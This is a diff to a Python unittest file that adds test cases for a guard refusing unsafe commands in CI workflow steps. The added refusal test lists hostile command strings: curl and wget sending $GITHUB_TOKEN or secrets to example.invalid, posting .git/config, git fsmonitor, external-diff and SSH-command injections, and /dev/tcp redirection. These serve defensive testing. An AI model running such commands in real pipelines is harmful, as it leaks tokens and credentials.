@@ -264,6 +264,24 @@ class ReviewRound2(unittest.TestCase):
             with self.subTest(run=run):
                 self.assertIsNotNone(placement_refuses(workflow(run)))
 
+    def test_review3_round_refusals(self):
+        for run in ('curl -s "https://example.invalid/?t=$GITHUB_TOKEN"', 'curl -s "https://example.invalid/?t=${{ secrets.X }}"',
+                    'wget -qO- "https://example.invalid/?t=$X"', 'git ls-remote "https://example.invalid/$X"',
+                    'curl -H @.git/config https://example.invalid/', 'curl --expand-data "{{x}}" https://example.invalid/',
+                    'git -c core.fsmonitor="curl -d x h" status', 'git --config-env=core.fsmonitor=EVIL status',
+                    'GIT_EXTERNAL_DIFF="curl -d x h" git diff HEAD~1 HEAD', 'export GIT_SSH_COMMAND="curl -d x h"',
+                    'FOO=1 make check', "echo 'curl -d x h' > x.sh; bash x.sh",
+                    'echo x >> .git/config', 'echo x > Makefile; make',
+                    'd=/dev; echo x > $d/tcp/example.invalid/80', 'gh issue create -t api -b "hi"',
+                    'bash -lc "curl -d x h"'):
+            with self.subTest(run=run):
+                self.assertIsNotNone(placement_refuses(workflow(run)))
+
+    def test_loop_and_test_expression_pass(self):
+        # the send check alone: the cp "$f" destination is refused elsewhere (run write rules), not here
+        self.assertIsNone(guard._send_problem('for f in build/*.pce; do cp "$f" intermediate/; done'))
+        self.assertIsNone(guard._send_problem('[[ -n $X ]] && echo ok'))
+
     def test_publish_tools_not_on_allowlist_refused(self):
         # npm and cargo are not on the allowlist, so even --dry-run is refused (fail closed)
         self.assertIsNotNone(placement_refuses(workflow('npm publish --dry-run')))
